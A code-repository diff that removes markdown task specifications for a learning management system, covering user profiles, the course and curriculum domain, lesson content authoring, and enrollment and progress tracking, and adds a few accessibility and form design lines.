- 66:   updatedAt     DateTime   @updatedAt
- 67: 
- 68:   // LMS Profile Fields
- 69:   headline      String?
- 70:   bio           String?
- 71:   avatarUrl     String?
- 72:   website       String?
- 73: 
- 74:   // Relations
- 75:   sessions        Session[]
- 76:   accounts        Account[]
- 77:   userRoles       UserRole[]
- 78:   authoredCourses Course[]           @relation("AuthoredCourses")
- 79:   enrollments     CourseEnrollment[]
- 80:   lessonProgress  LessonProgress[]
- 81: 
- 82:   @@map("user")
- 83: }
- 84: ```
- 85: 
- 86: ### Model Specifications
- 87: - **Why it exists**: Instructors need credentials, bios, and avatars displayed on course pages; students need profile settings.
- 88: - **Requirement**: Course author attribution and user self-management.
- 89: - **Ownership**: Owned exclusively by the individual user.
- 90: - **Read Permissions**: Public for instructor profiles (`name`, `headline`, `bio`, `avatarUrl`); private for student account settings.
- 91: - **Mutation Permissions**: Self-only (`session.userId === user.id`).
- 92: - **Constraints**: Server-side `cuid()`. Text fields constrained by character limits.
- 93: - **Status**: Core MVP.
- 94: 
- 95: ---
- 96: 
- 97: ## Authorization Rules
- 98: 
- 99: ```
-100: ┌────────────────────────────────────────────────────────┐
-101: │ 1. Authentication                                      │
-102: │    requireAuth() verifies active session.              │
-103: └──────────────────────────┬─────────────────────────────┘
-104:                            │
-105:                            ▼
-106: ┌────────────────────────────────────────────────────────┐
-107: │ 2. Role Verification                                   │
-108: │    Any authenticated user holds 'student' permissions. │
-109: │    'instructor' role required for teaching management. │
-110: └──────────────────────────┬─────────────────────────────┘
-111:                            │
-112:                            ▼
-113: ┌────────────────────────────────────────────────────────┐
-114: │ 3. Resource Self-Ownership                             │
-115: │    User A CANNOT modify User B's profile.              │
-116: │    session.userId MUST strictly match profile userId.  │
-117: └──────────────────────────┬─────────────────────────────┘
-118:                            │
-119:                            ▼
-120: ┌────────────────────────────────────────────────────────┐
-121: │ 4. Privilege Escalation Prevention                     │
-122: │    Users CANNOT grant themselves 'instructor' or       │
-123: │    'admin' roles via profile updates. Role assignment  │
-124: │    requires admin permission via RoleService.          │
-125: └────────────────────────────────────────────────────────┘
-126: ```
-127: 
-128: ---
-129: 
-130: ## Validation
-131: 
-132: - **Profile Update Schema** (`src/lib/validations/profile.ts`):
-133:   ```typescript
-134:   export const updateProfileSchema = z.object({
-135:     name: z.string().trim().min(2, "Name must be at least 2 characters").max(50),
-136:     headline: z.string().trim().max(100, "Headline cannot exceed 100 characters").optional().or(z.literal("")),
-137:     bio: z.string().trim().max(1000, "Bio cannot exceed 1000 characters").optional().or(z.literal("")),
-138:     website: z.string().trim().url("Invalid website URL").max(200).optional().or(z.literal("")),
-139:     avatarUrl: z.string().trim().url("Invalid avatar URL").optional().or(z.literal("")),
-140:   });
-141:   export type UpdateProfileInput = z.infer<typeof updateProfileSchema>;
-142:   ```
-143: 
-144: ---
-145: 
-146: ## Error Handling
-147: 
-148: - **Self-Ownership Violation**: Throws `ForbiddenError("You cannot modify another user's profile")`.
-149: - **Validation Failure**: Returns `actionFailure` with field-level validation messages.
-150: - **Missing User**: Throws `NotFoundError("User does not exist")`.
-151: 
-152: ---
-153: 
-154: ## UI / UX Requirements
-155: 
-156: - Settings page located at `/settings/profile`.
-157: - Adheres to Design Rules:
-158:   - Touch targets minimum 40x40px on all inputs and buttons.
-159:   - Active press feedback (`active:scale-[0.98]`).
-160:   - No em-dashes or en-dashes in visible copy.
-161:   - Loading spinner during submission, toast notification on success/failure.
-162:   - Full keyboard accessibility and proper label associations.
-163: 
-164: ---
-165: 
-166: ## Testing Strategy
-167: 
-168: - **Service Unit Tests** (`src/services/__tests__/profile.test.ts`):
-169:   - Test profile update succeeds for the owner.
-170:   - Test profile update throws `ForbiddenError` when `session.userId !== targetUserId`.
-171:   - Test role assignment blocks non-admin callers.
-172: - **Validation Tests** (`src/lib/validations/__tests__/profile.test.ts`):
-173:   - Test valid inputs pass.
-174:   - Test overly long bio or invalid URLs fail validation.
-175: - **Component Tests** (`src/components/profile/__tests__/profile-form.test.ts`):
-176:   - Test form renders current profile data.
-177:   - Test validation errors display inline on invalid input.
-178: 
-179: ---
-180: 
-181: ## Documentation Updates
-182: 
-183: - Update `docs/reference/Entities.md` with new `User` profile fields.
-184: - Document role management in `docs/Authentication.md`.
-185: 
-186: ---
-187: 
-188: ## Acceptance Criteria
-189: 
-190: - [x] Database migration successfully adds profile columns to `user` table.
-191: - [x] Database seed script initializes default roles (`student`, `instructor`, `admin`).
-192: - [x] Users can edit their own profile through `/settings/profile`.
-193: - [x] Any attempt to edit another user's profile fails with 403 Forbidden.
-194: - [x] No client can elevate their own role through profile updates.
-195: - [x] Unit and component tests pass with 100% success rate.
-196: - [x] `pnpm typecheck` and `pnpm lint` pass with zero errors.
-197: 
-198: ---
-199: 
-200: ## Definition of Done
-201: 
-202: - [x] Layered architecture adhered to: `UI → Actions → Services → Concrete Repositories → DB`.
-203: - [x] Type-safe: Strict TypeScript, zero `any`.
-204: - [x] Validated: Zod schema parses all profile inputs.
-205: - [x] Authorized: Self-ownership strictly enforced; privilege escalation blocked.
-206: - [x] Tested: Unit tests verify ownership checks and role isolation.
-207: - [x] Documented: Entity reference updated in docs.
-208: - [x] Clean quality gate: Passes lint, typecheck, and test checks.
-`````
-
-## File: docs/tasks/03-course-curriculum-domain.md
-`````markdown
-  1: # Task 03: Course & Curriculum Domain
-  2: 
-  3: ## Objective
-  4: 
-  5: Implement the foundational domain models, concrete repositories, business logic services, and Server Actions for the core LMS hierarchy: **Course → Module → Lesson**, enforcing strict instructor resource ownership, deterministic sequential ordering (`orderIndex`), and course publication lifecycle prerequisites.
-  6: 
-  7: ---
-  8: 
-  9: ## Scope
- 10: 
- 11: ### In Scope
- 12: - Prisma models: `Course`, `Module`, and `Lesson` with explicit integer `orderIndex` and lifecycle states (`DRAFT`, `PUBLISHED`, `ARCHIVED`).
- 13: - Concrete domain repositories: `CourseRepository`, `ModuleRepository`, and `LessonRepository` (no generic base classes).
- 14: - `CourseService`: course creation with auto-slug generation, metadata updates, deletion, and publication validation (enforcing >= 1 module and >= 1 lesson).
- 15: - `CurriculumService`: module/lesson creation, title updates, atomic reordering via Prisma transactions, and parent course ownership verification.
- 16: - Server Actions for course and curriculum mutations with Zod input parsing and standardized `ActionResult<T>` returns.
- 17: 
- 18: ### Out of Scope
- 19: - Lesson content body storage and rich text editing (dedicated to Task 04).
- 20: - Student enrollment and progress tracking (dedicated to Task 05).
- 21: - Course catalog browsing UI (dedicated to Task 06).
- 22: - Instructor management UI views (dedicated to Task 07).
- 23: 
- 24: ---
- 25: 
- 26: ## Dependencies
- 27: 
- 28: - **Preceding Tasks**:
- 29:   - `Task 01`: `ActionResult<T>`, `requireAuth()`, `requireRole()`, error hierarchy.
- 30:   - `Task 02`: User identity with instructor role and author relations.
- 31: - **Existing Packages**:
- 32:   - `@prisma/client`, `zod`.
- 33: 
- 34: ---
- 35: 
- 36: ## Architecture Impact
- 37: 
- 38: Strictly follows layered architecture:
- 39: ```
- 40: Actions (src/actions/course.ts, src/actions/curriculum.ts)
- 41:   ↓ requireAuth(), Zod parse
- 42: Services (src/services/course.ts, src/services/curriculum.ts)
- 43:   ↓ Enforces Authentication, Instructor Role, Resource Ownership & State Validation
- 44: Concrete Repositories (src/repositories/course.ts, module.ts, lesson.ts)
- 45:   ↓ Concrete Prisma queries
- 46: Database (PostgreSQL)
- 47: ```
- 48: 
- 49: ---
- 50: 
- 51: ## Data Model Impact
- 52: 
- 53: ```prisma
- 54: enum CourseStatus {
- 55:   DRAFT
- 56:   PUBLISHED
- 57:   ARCHIVED
- 58: }
- 59: 
- 60: enum CourseLevel {
- 61:   BEGINNER
- 62:   INTERMEDIATE
- 63:   ADVANCED
- 64:   ALL_LEVELS
- 65: }
- 66: 
- 67: model Course {
- 68:   id           String             @id @default(cuid())
- 69:   title        String
- 70:   slug         String             @unique
- 71:   description  String?
- 72:   thumbnailUrl String?
- 73:   status       CourseStatus       @default(DRAFT)
- 74:   level        CourseLevel        @default(ALL_LEVELS)
- 75:   category     String?
- 76:   instructorId String
- 77:   instructor   User               @relation("AuthoredCourses", fields: [instructorId], references: [id], onDelete: Cascade)
- 78:   modules      Module[]
- 79:   enrollments  CourseEnrollment[]
- 80:   createdAt    DateTime           @default(now())
- 81:   updatedAt    DateTime           @updatedAt
- 82: 
- 83:   @@index([instructorId])
- 84:   @@index([status])
- 85:   @@index([slug])
- 86:   @@map("course")
- 87: }
- 88: 
- 89: model Module {
- 90:   id          String   @id @default(cuid())
- 91:   title       String
- 92:   description String?
- 93:   orderIndex  Int      @default(0)
- 94:   courseId    String
- 95:   course      Course   @relation(fields: [courseId], references: [id], onDelete: Cascade)
- 96:   lessons     Lesson[]
- 97:   createdAt   DateTime @default(now())
- 98:   updatedAt   DateTime @updatedAt
- 99: 
-100:   @@index([courseId])
-101:   @@index([courseId, orderIndex])
-102:   @@map("module")
-103: }
-104: 
-105: model Lesson {
-106:   id              String           @id @default(cuid())
-107:   title           String
-108:   slug            String
-109:   orderIndex      Int              @default(0)
-110:   durationMinutes Int?
-111:   isFreePreview   Boolean          @default(false)
-112:   moduleId        String
-113:   module          Module           @relation(fields: [moduleId], references: [id], onDelete: Cascade)
-114:   content         LessonContent?
-115:   progressRecords LessonProgress[]
-116:   createdAt       DateTime         @default(now())
-117:   updatedAt       DateTime         @updatedAt
-118: 
-119:   @@unique([moduleId, slug])
-120:   @@index([moduleId])
-121:   @@index([moduleId, orderIndex])
-122:   @@map("lesson")
-123: }
-124: ```
-125: 
-126: ### Model Specifications
-127: - **Course**:
-128:   - *Why*: Represents the top-level educational curriculum offering.
-129:   - *Requirement*: Educational course management and cataloging.
-130:   - *Ownership*: Owned by the authoring instructor (`instructorId`).
-131:   - *Read*: Public if `status === PUBLISHED`; authoring instructor and admin if `DRAFT`/`ARCHIVED`.
-132:   - *Mutate*: Authoring instructor only (`session.userId === course.instructorId`) or admin.
-133: - **Module**:
-134:   - *Why*: Structural grouping of lessons with sequential order (`orderIndex`).
-135:   - *Ownership*: Inferred from parent `Course.instructorId`.
-136:   - *Mutate*: Parent course instructor only.
-137: - **Lesson**:
-138:   - *Why*: Atomic lesson unit within a module.
-139:   - *Ownership*: Inferred from parent `Module → Course.instructorId`.
-140:   - *Mutate*: Parent course instructor only.
-141: 
-142: ---
-143: 
-144: ## Authorization Rules
-145: 
-146: ```
-147: ┌────────────────────────────────────────────────────────┐
-148: │ 1. Authentication Check                                │
-149: │    requireAuth() verifies active session.              │
-150: └──────────────────────────┬─────────────────────────────┘
-151:                            │
-152:                            ▼
-153: ┌────────────────────────────────────────────────────────┐
-154: │ 2. Role Check                                          │
-155: │    Caller must hold 'instructor' or 'admin' role to    │
-156: │    create or manage courses and curriculum.            │
-157: └──────────────────────────┬─────────────────────────────┘
-158:                            │
-159:                            ▼
-160: ┌────────────────────────────────────────────────────────┐
-161: │ 3. Resource Ownership Check                            │
-162: │    - CourseService asserts:                            │
-163: │      course.instructorId === session.userId            │
-164: │    - CurriculumService queries parent Course and       │
-165: │      asserts caller is the authoring instructor.       │
-166: │    - Instructor A CANNOT edit Instructor B's course.   │
-167: └──────────────────────────┬─────────────────────────────┘
-168:                            │
-169:                            ▼
-170: ┌────────────────────────────────────────────────────────┐
-171: │ 4. Resource State Validation                           │
-172: │    - Course publishing requires >= 1 module and        │
-173: │      >= 1 lesson in the curriculum.                    │
-174: │    - Unenrolled students cannot access non-preview     │
-175: │      lessons or unpublished courses.                   │
-176: └────────────────────────────────────────────────────────┘
-177: ```
-178: 
-179: ---
-180: 
-181: ## Validation
-182: 
-183: - **Course & Curriculum Schemas** (`src/lib/validations/course.ts`):
-184:   ```typescript
-185:   export const createCourseSchema = z.object({
-186:     title: z.string().trim().min(3, "Title must be at least 3 characters").max(100),
-187:     description: z.string().trim().max(1000).optional(),
-188:     level: z.enum(["BEGINNER", "INTERMEDIATE", "ADVANCED", "ALL_LEVELS"]).default("ALL_LEVELS"),
-189:     category: z.string().trim().max(50).optional(),
-190:     thumbnailUrl: z.string().trim().url("Invalid URL").optional().or(z.literal("")),
-191:   });
-192: 
-193:   export const createModuleSchema = z.object({
-194:     courseId: z.string().cuid(),
-195:     title: z.string().trim().min(2).max(100),
-196:     description: z.string().trim().max(500).optional(),
-197:   });
-198: 
-199:   export const createLessonSchema = z.object({
-200:     moduleId: z.string().cuid(),
-201:     title: z.string().trim().min(2).max(100),
-202:     durationMinutes: z.number().int().nonnegative().max(600).optional(),
-203:     isFreePreview: z.boolean().default(false),
-204:   });
-205: 
-206:   export const reorderCurriculumSchema = z.object({
-207:     courseId: z.string().cuid(),
-208:     orderedIds: z.array(z.string().cuid()).min(1),
-209:   });
-210:   ```
-211: 
-212: ---
-213: 
-214: ## Error Handling
-215: 
-216: - **Ownership Mismatch**: Throws `ForbiddenError("You are not authorized to modify this course")`.
-217: - **Publishing Without Content**: Throws `ValidationError("Cannot publish a course without at least one module and one lesson")`.
-218: - **Duplicate Slugs**: Handled deterministically by appending incremental suffixes (`slug-2`).
-219: - **Missing Resource**: Throws `NotFoundError` with resource details.
-220: 
-221: ---
-222: 
-223: ## UI / UX Requirements
-224: 
-225: No user-facing views built in this task. Establishes data models, schemas, and Server Actions consumed by the Student Experience (Task 06) and Instructor Workspace (Task 07).
-226: 
-227: ---
-228: 
-229: ## Testing Strategy
-230: 
-231: - **Service Unit Tests** (`src/services/__tests__/course.test.ts`, `curriculum.test.ts`):
-232:   - Test course creation automatically assigns `instructorId` from session.
-233:   - Test Instructor A cannot update or delete Instructor B's course (throws `ForbiddenError`).
-234:   - Test publishing fails if course has 0 modules or 0 lessons.
-235:   - Test publishing succeeds when valid curriculum exists.
-236:   - Test module reordering executes atomic `orderIndex` updates.
-237:   - Test lesson reordering updates sequence numbers within a module.
-238: - **Repository Integration Tests** (`src/repositories/__tests__/course.test.ts`):
-239:   - Test `findManyPublished` filters out `DRAFT` and `ARCHIVED` courses.
-240:   - Test cascade deletion removes modules and lessons when course is deleted.
-241: 
-242: ---
-243: 
-244: ## Documentation Updates
-245: 
-246: - Update `docs/reference/Entities.md` with `Course`, `Module`, and `Lesson` schemas.
-247: - Document atomic curriculum reordering patterns in `docs/Architecture.md`.
-248: 
-249: ---
-250: 
-251: ## Acceptance Criteria
-252: 
-253: - [x] Prisma migration applies `Course`, `Module`, and `Lesson` models cleanly.
-254: - [x] Slugs are generated server-side from title with duplicate collision resolution.
-255: - [x] Concrete repositories (`CourseRepository`, `ModuleRepository`, `LessonRepository`) implemented without generic base class abstractions.
-256: - [x] `CourseService` and `CurriculumService` enforce role, ownership, and state validation.
-257: - [x] Module and lesson reordering updates `orderIndex` in an atomic Prisma transaction.
-258: - [x] Unit and integration tests cover ownership boundaries, publishing checks, and reordering.
-259: - [x] Zero TypeScript errors (`pnpm typecheck`) and clean lint (`pnpm lint`).
-260: 
-261: ---
-262: 
-263: ## Definition of Done
-264: 
-265: - [x] Layered architecture adhered to: `UI → Actions → Services → Concrete Repositories → DB`.
-266: - [x] Type-safe: Strict TypeScript, zero `any`.
-267: - [x] Validated: Zod schemas validate all inputs at the Action boundary.
-268: - [x] Authorized: 4-tier authorization (authentication, role, ownership, state) tested and enforced.
-269: - [x] Tested: Unit tests verify ownership violation, valid curriculum building, and publishing constraints.
-270: - [x] Documented: Entity reference updated in docs.
-271: - [x] Clean quality gate: Passes lint, typecheck, and test checks.
-`````
-
-## File: docs/tasks/04-lesson-content-authoring.md
-`````markdown
-  1: # Task 04: Lesson Content Authoring & Media Handling
-  2: 
-  3: ## Objective
-  4: 
-  5: Implement a requirement-driven lesson content authoring system, enabling instructors to author educational lesson materials (markdown/text, code blocks, and video embed URLs) with server-side HTML sanitization and parent course ownership verification, avoiding premature storage provider frameworks.
-  6: 
-  7: ---
-  8: 
-  9: ## Scope
- 10: 
- 11: ### In Scope
- 12: - Prisma model `LessonContent` linked 1-to-1 with `Lesson` to isolate heavy textual content from lightweight curriculum queries.
- 13: - Requirement-driven content fields: `bodyMarkdown`, sanitized `bodyHtml`, and `videoUrl`.
- 14: - Resource attachment references stored as simple structured URLs (`name`, `url`) without complex multi-provider upload engines.
- 15: - Server-side HTML sanitization pipeline stripping unsafe script tags, inline event handlers, and dangerous iframe targets.
- 16: - Video URL normalizer supporting YouTube, Vimeo, Loom, and direct video embeds.
- 17: - `LessonContentService` and concrete `LessonContentRepository` enforcing parent course instructor ownership.
- 18: - Focused authoring UI component with markdown/text editing, code snippet support, and video preview.
- 19: 
- 20: ### Out of Scope
- 21: - S3 / cloud storage provider abstraction layers, presigned URL pipelines, or custom file upload infrastructure.
- 22: - Real-time collaborative document editing.
- 23: - Video transcoding queues or custom video streaming servers.
+ 20: - Visible focus rings on all interactive elements.
+ 21: - Focus should follow logical tab order.
+ 22: - Skip links for keyboard navigation.
+ 23: - Focus trapping in modals and dialogs.
  24: 
  25: ---
  26: 
- 27: ## Dependencies
+ 27: # Forms
  28: 
- 29: - **Preceding Tasks**:
- 30:   - `Task 01`: `ActionResult<T>`, `requireAuth()`, error hierarchy.
- 31:   - `Task 02`: User identity and instructor persona.
- 32:   - `Task 03`: `Lesson`, `Module`, and `Course` domain models and hierarchy.
- 33: - **Packages**:
- 34:   - `@prisma/client`, `zod`, `lucide-react`.
- 35:   - Sanitization package for server-side HTML cleaning.
- 36: 
- 37: ---
- 38: 
- 39: ## Architecture Impact
- 40: 
- 41: ```
- 42: Lesson Content Editor (Client Component leaf)
- 43:   ↓ calls
- 44: updateLessonContentAction (src/actions/lesson-content.ts)
- 45:   ↓ requireAuth(), Zod parse
- 46: LessonContentService (src/services/lesson-content.ts)
- 47:   ↓ Traverses Lesson → Module → Course, verifies course.instructorId === session.userId
- 48:   ↓ Normalizes video URL & executes server-side HTML sanitization
- 49: LessonContentRepository (src/repositories/lesson-content.ts)
- 50:   ↓ concrete Prisma upsert
- 51: Database (PostgreSQL)
- 52: ```
- 53: 
- 54: ---
- 55: 
- 56: ## Data Model Impact
- 57: 
- 58: ```prisma
- 59: model LessonContent {
- 60:   id           String   @id @default(cuid())
- 61:   lessonId     String   @unique
- 62:   lesson       Lesson   @relation(fields: [lessonId], references: [id], onDelete: Cascade)
- 63:   bodyMarkdown String?
- 64:   bodyHtml     String?
- 65:   videoUrl     String?
- 66:   resources    Json?    // Array of { name: string, url: string }
- 67:   createdAt    DateTime @default(now())
- 68:   updatedAt    DateTime @updatedAt
- 69: 
- 70:   @@map("lesson_content")
- 71: }
- 72: ```
- 73: 
- 74: ### Model Specifications
- 75: - **Why it exists**: Isolates large textual content and video URLs from lightweight curriculum navigation queries.
- 76: - **Requirement**: Delivering structured educational text, code, and video lessons.
- 77: - **Ownership**: Inferred from parent `Lesson → Module → Course.instructorId`.
- 78: - **Read Permissions**:
- 79:   - If `lesson.isFreePreview === true`: Publicly readable.
- 80:   - If `lesson.isFreePreview === false`: Enrolled students (Task 05), authoring instructor, or admin only.
- 81: - **Mutation Permissions**: Authoring instructor only (`session.userId === course.instructorId`).
- 82: - **Constraints**: 1-to-1 unique relation on `lessonId`.
- 83: - **Status**: Core MVP.
- 84: 
- 85: ---
- 86: 
- 87: ## Authorization Rules
- 88: 
- 89: ```
- 90: ┌────────────────────────────────────────────────────────┐
- 91: │ 1. Authentication Check                                │
- 92: │    requireAuth() verifies active session.              │
- 93: └──────────────────────────┬─────────────────────────────┘
- 94:                            │
- 95:                            ▼
- 96: ┌────────────────────────────────────────────────────────┐
- 97: │ 2. Role Check                                          │
- 98: │    Caller must hold 'instructor' or 'admin' role.      │
- 99: └──────────────────────────┬─────────────────────────────┘
-100:                            │
-101:                            ▼
-102: ┌────────────────────────────────────────────────────────┐
-103: │ 3. Parent Course Resource Ownership Check              │
-104: │    LessonContentService fetches parent Lesson, Module, │
-105: │    and Course in a single query.                       │
-106: │    Asserts: course.instructorId === session.userId.    │
-107: │    Instructor A CANNOT edit Lesson in Instructor B's   │
-108: │    course!                                             │
-109: └──────────────────────────┬─────────────────────────────┘
-110:                            │
-111:                            ▼
-112: ┌────────────────────────────────────────────────────────┐
-113: │ 4. Read Access Enforcement                             │
-114: │    Unenrolled users attempting to read non-preview     │
-115: │    LessonContent are rejected with 403 Forbidden.      │
-116: └────────────────────────────────────────────────────────┘
-117: ```
-118: 
-119: ---
-120: 
-121: ## Validation
-122: 
-123: - **Content Schema** (`src/lib/validations/lesson-content.ts`):
-124:   ```typescript
-125:   export const updateLessonContentSchema = z.object({
-126:     lessonId: z.string().cuid(),
-127:     bodyMarkdown: z.string().max(50000).optional(),
-128:     videoUrl: z.string().trim().url("Invalid video URL").max(500).optional().or(z.literal("")),
-129:     resources: z
-130:       .array(
-131:         z.object({
-132:           name: z.string().trim().min(1).max(100),
-133:           url: z.string().url("Invalid resource URL"),
-134:         }),
-135:       )
-136:       .max(10)
-137:       .optional(),
-138:   });
-139:   export type UpdateLessonContentInput = z.infer<typeof updateLessonContentSchema>;
-140:   ```
-141: 
-142: ---
-143: 
-144: ## Error Handling
-145: 
-146: - **Ownership Mismatch**: Throws `ForbiddenError("You are not authorized to edit this lesson content")`.
-147: - **Invalid Video URL**: Returns `actionFailure("Unsupported video URL format. Use YouTube, Vimeo, Loom, or direct video link.")`.
-148: - **Malicious Content**: Dangerous script tags or invalid protocols are stripped during sanitization; severe schema errors return `ValidationError`.
-149: 
-150: ---
-151: 
-152: ## UI / UX Requirements
-153: 
-154: - Simple, focused editor interface:
-155:   - Clean markdown / structured text area with code block preview.
-156:   - Video URL input field with instant embed preview.
-157:   - Resource link list showing attachment names with direct links.
-158:   - Autosave debouncing with visual status indicator ("Saved", "Saving...", "Unsaved changes").
-159: - Compliant with Design Rules (40x40px touch targets, active press feedback, no em-dashes).
-160: 
-161: ---
-162: 
-163: ## Testing Strategy
-164: 
-165: - **Service Unit Tests** (`src/services/__tests__/lesson-content.test.ts`):
-166:   - Test ownership check: Instructor A cannot update content for a lesson owned by Instructor B.
-167:   - Test video URL normalizer correctly parses YouTube watch/shorts URLs, Vimeo IDs, and Loom URLs into embed format.
-168:   - Test server-side sanitization strips `<script>`, `onerror`, and `javascript:` pseudo-protocols from generated HTML.
-169: - **Repository Integration Tests** (`src/repositories/__tests__/lesson-content.test.ts`):
-170:   - Test upsert creates `LessonContent` if none exists, and updates if already present.
-171: 
-172: ---
-173: 
-174: ## Documentation Updates
-175: 
-176: - Update `docs/reference/Entities.md` with `LessonContent` schema.
-177: - Document supported video embed formats in `docs/Coding Standards.md`.
-178: 
-179: ---
-180: 
-181: ## Acceptance Criteria
-182: 
-183: - [x] `LessonContent` model migration applied with 1-to-1 unique index on `lessonId`.
-184: - [x] Server-side sanitization eliminates XSS vectors from lesson text.
-185: - [x] Video embed normalization supports YouTube, Vimeo, and Loom.
-186: - [x] `LessonContentService` strictly verifies parent course instructor ownership.
-187: - [x] Unenrolled users cannot read non-preview lesson content.
-188: - [x] Unit tests cover ownership enforcement, video normalization, and HTML sanitization.
-189: - [x] TypeScript check and lint pass cleanly.
-190: 
-191: ---
-192: 
-193: ## Definition of Done
-194: 
-195: - [x] Layered architecture adhered to: `UI → Actions → Services → Concrete Repositories → DB`.
-196: - [x] Type-safe: Strict TypeScript, zero `any`.
-197: - [x] Validated: Zod schema enforces length and URL constraints.
-198: - [x] Authorized: Parent course ownership verified on every update.
-199: - [x] Tested: Sanitization and ownership test suites pass with 100% success rate.
-200: - [x] Minimal: No speculative storage engines or complex editor ecosystems.
-201: - [x] Clean quality gate: Passes lint, typecheck, and test checks.
-`````
-
-## File: docs/tasks/05-enrollment-progress-tracking.md
-`````markdown
-  1: # Task 05: Enrollment & Learning Progress Tracking
-  2: 
-  3: ## Objective
-  4: 
-  5: Implement the student course enrollment lifecycle and individual, user-isolated lesson progress tracking—strictly enforcing that progress is student-specific and cannot leak across users—while calculating aggregate course completion percentages and computing sequential lesson progression.
-  6: 
-  7: ---
-  8: 
-  9: ## Scope
- 10: 
- 11: ### In Scope
- 12: - Prisma models:
- 13:   - `CourseEnrollment`: tracks user-course enrollment state (`ACTIVE`, `COMPLETED`, `ARCHIVED`) and aggregate completion percentage.
- 14:   - `LessonProgress`: individual per-user lesson completion state.
- 15: - Concrete domain repositories: `EnrollmentRepository` and `LessonProgressRepository`.
- 16: - `EnrollmentService`: handles student enrollment, verifies course publishing state, and checks access rights.
- 17: - `ProgressService`: toggles lesson completion, recalculates course completion percentage in an atomic transaction, marks course completion upon reaching 100%, and determines the next sequential lesson.
- 18: - Server Actions for enrollment and lesson completion toggling.
- 19: - UI components for enrollment CTA, lesson completion checkbox/button, and animated course progress bar.
- 20: 
- 21: ### Out of Scope
- 22: - Payment processing or subscription checkout for paid enrollments (postponed to Future Considerations).
- 23: - Automated certificate generation upon completion (postponed to Future Considerations).
- 24: - Bulk CSV enrollment imports for institutional accounts.
- 25: 
- 26: ---
- 27: 
- 28: ## Dependencies
- 29: 
- 30: - **Preceding Tasks**:
- 31:   - `Task 01`: `ActionResult<T>`, `requireAuth()`, error hierarchy.
- 32:   - `Task 02`: User identity and student persona.
- 33:   - `Task 03`: `Course`, `Module`, and `Lesson` hierarchy with ordering.
- 34: - **Packages**:
- 35:   - `@prisma/client`, `zod`, `lucide-react`.
- 36: 
- 37: ---
- 38: 
- 39: ## Architecture Impact
- 40: 
- 41: ```
- 42: Lesson Player UI (Client Component leaf)
- 43:   ↓ calls
- 44: toggleLessonCompletionAction (src/actions/progress.ts)
- 45:   ↓ requireAuth(), Zod parse
- 46: ProgressService (src/services/progress.ts)
- 47:   ↓ Enforces session.userId ownership on progress records
- 48:   ↓ Recalculates total lessons vs completed in course
- 49:   ↓ Updates CourseEnrollment.progressPercentage inside a Prisma transaction
- 50: Concrete Repositories (LessonProgressRepository & EnrollmentRepository)
- 51:   ↓ atomic database writes
- 52: PostgreSQL Database
- 53: ```
- 54: 
- 55: ---
- 56: 
- 57: ## Data Model Impact
- 58: 
- 59: ```prisma
- 60: enum EnrollmentStatus {
- 61:   ACTIVE
- 62:   COMPLETED
- 63:   ARCHIVED
- 64: }
- 65: 
- 66: model CourseEnrollment {
- 67:   id                 String           @id @default(cuid())
- 68:   userId             String
- 69:   courseId           String
- 70:   status             EnrollmentStatus @default(ACTIVE)
- 71:   progressPercentage Int              @default(0) // 0 to 100
- 72:   enrolledAt         DateTime         @default(now())
- 73:   completedAt        DateTime?
- 74:   lastAccessedAt     DateTime         @default(now())
- 75:   user               User             @relation(fields: [userId], references: [id], onDelete: Cascade)
- 76:   course             Course           @relation(fields: [courseId], references: [id], onDelete: Cascade)
- 77: 
- 78:   @@unique([userId, courseId])
- 79:   @@index([userId])
- 80:   @@index([courseId])
- 81:   @@map("course_enrollment")
- 82: }
- 83: 
- 84: model LessonProgress {
- 85:   id             String    @id @default(cuid())
- 86:   userId         String
- 87:   lessonId       String
- 88:   isCompleted    Boolean   @default(false)
- 89:   completedAt    DateTime?
- 90:   lastAccessedAt DateTime  @default(now())
- 91:   user           User      @relation(fields: [userId], references: [id], onDelete: Cascade)
- 92:   lesson         Lesson    @relation(fields: [lessonId], references: [id], onDelete: Cascade)
- 93: 
- 94:   @@unique([userId, lessonId])
- 95:   @@index([userId])
- 96:   @@index([lessonId])
- 97:   @@map("lesson_progress")
- 98: }
- 99: ```
-100: 
-101: ### Model Specifications & Invariant Rules
-102: - **CRITICAL INVARIANT: Learning Progress Is User-Specific**:
-103:   - Legacy anti-pattern (`Section.complete: Boolean`) is strictly prohibited.
-104:   - Progress exists **only** in `LessonProgress` scoped to `(userId, lessonId)`.
-105: - **CourseEnrollment**:
-106:   - *Why*: Establishes student access to course lessons and tracks overall completion metrics.
-107:   - *Requirement*: Student enrollment and course progress aggregation.
-108:   - *Ownership*: Joint relation between `User` and `Course`.
-109:   - *Read*: Student self, course authoring instructor, and admin.
-110:   - *Mutate*: Student self (enroll) or System (progress aggregation).
-111: - **LessonProgress**:
-112:   - *Why*: Stores individual lesson completion state and last accessed timestamp.
-113:   - *Ownership*: Owned exclusively by the individual student (`userId`).
-114:   - *Read/Mutate*: Student self only (`session.userId === progress.userId`).
-115: 
-116: ---
-117: 
-118: ## Authorization Rules
-119: 
-120: ```
-121: ┌────────────────────────────────────────────────────────┐
-122: │ 1. Authentication Check                                │
-123: │    requireAuth() ensures valid session.                │
-124: └──────────────────────────┬─────────────────────────────┘
-125:                            │
-126:                            ▼
-127: ┌────────────────────────────────────────────────────────┐
-128: │ 2. Course Publishing Check                             │
-129: │    Students can ONLY enroll in PUBLISHED courses.      │
-130: │    Attempting to enroll in DRAFT course returns 400.   │
-131: └──────────────────────────┬─────────────────────────────┘
-132:                            │
-133:                            ▼
-134: ┌────────────────────────────────────────────────────────┐
-135: │ 3. Progress Ownership Isolation                        │
-136: │    Student A CANNOT view or mutate Student B's         │
-137: │    progress! All progress queries and writes are       │
-138: │    strictly forced to session.userId.                  │
-139: └──────────────────────────┬─────────────────────────────┘
-140:                            │
-141:                            ▼
-142: ┌────────────────────────────────────────────────────────┐
-143: │ 4. Lesson Content Access Check                         │
-144: │    A student must have an ACTIVE enrollment in the     │
-145: │    parent course to access restricted lesson content.  │
-146: └────────────────────────────────────────────────────────┘
-147: ```
-148: 
-149: ---
-150: 
-151: ## Validation
-152: 
-153: - **Enrollment & Progress Schemas** (`src/lib/validations/progress.ts`):
-154:   ```typescript
-155:   export const enrollCourseSchema = z.object({
-156:     courseId: z.string().cuid(),
-157:   });
-158: 
-159:   export const toggleLessonProgressSchema = z.object({
-160:     lessonId: z.string().cuid(),
-161:     completed: z.boolean(),
-162:   });
-163:   ```
-164: 
-165: ---
-166: 
-167: ## Error Handling
-168: 
-169: - **Unpublished Course Enrollment**: Throws `ValidationError("Cannot enroll in an unpublished course")`.
